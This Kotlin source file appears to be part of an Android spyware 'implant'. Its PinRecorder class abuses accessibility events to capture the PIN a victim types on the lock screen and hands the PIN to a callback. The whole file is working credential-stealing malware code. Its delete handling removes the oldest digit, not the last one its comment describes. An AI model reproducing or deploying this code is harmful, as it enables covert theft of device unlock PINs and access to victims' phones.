/*
* Records PINs entered on the lock screen.
* Since the PIN pad widgets are regular Buttons, an AccessibilityEvent with the text is sent.
* This class parses PINs from a stream of these AccessibilityEvents.
* */
package com.cooperthecoder.implant

import android.view.accessibility.AccessibilityEvent
import java.util.*

class PinRecorder(val callback: Callback) {

    private object PinPad {
        val ONE = "[1]"
        val TWO = "[ABC, 2]"
        val THREE = "[DEF, 3]"
        val FOUR = "[GHI, 4]"
        val FIVE = "[JKL, 5]"
        val SIX = "[MNO, 6]"
        val SEVEN = "[PQRS, 7]"
        val EIGHT = "[TUV, 8]"
        val NINE = "[WXYZ, 9]"
        val ZERO = "[0, +]"
        val DELETE = "[Delete]"
        val ENTER = "[Enter]"
        val EMERGENCY = "[Emergency]"
    }

    private val queue = LinkedList<String>()

    fun appendPinDigit(event: AccessibilityEvent) {
        val eventText = event.text.toString()
        when (eventText) {
            PinPad.DELETE -> {
                // Remove the last digit logged if the user pressed delete.
                queue.poll()
            }

            PinPad.ENTER -> {
                callback.onPinRecorded(queue.joinToString("-"))
                queue.clear()
            }

            PinPad.EMERGENCY -> {
                // Ignore these
            }

            else -> {
                queue.add(eventText)
            }

        }
    }

    fun clearPinQueue() {
        queue.clear()
    }

    interface Callback {
        fun onPinRecorded(pin: String)
    }

}